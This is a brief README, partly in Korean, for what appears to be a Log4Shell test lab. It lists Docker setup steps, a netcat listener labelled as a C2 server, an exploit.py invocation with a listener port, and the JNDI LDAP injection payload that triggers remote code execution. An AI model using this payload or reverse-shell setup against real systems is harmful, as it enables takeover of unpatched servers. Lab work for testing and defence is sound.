# java-log4shell
log4shell test


# 환경구성
docker-compose build
docker-compose up

# 데이터 세팅
http://[IP]:8080/log4shell/create -> 데이터 삽입

# C2 서버
nc -lvnp 9001

pip3 install -r requirements.txt
python3 exploit.py --userip $(serverip) --webport 8000 --lport 9001

# 페이로드 
${jndi:ldap://[IP]:1389/a}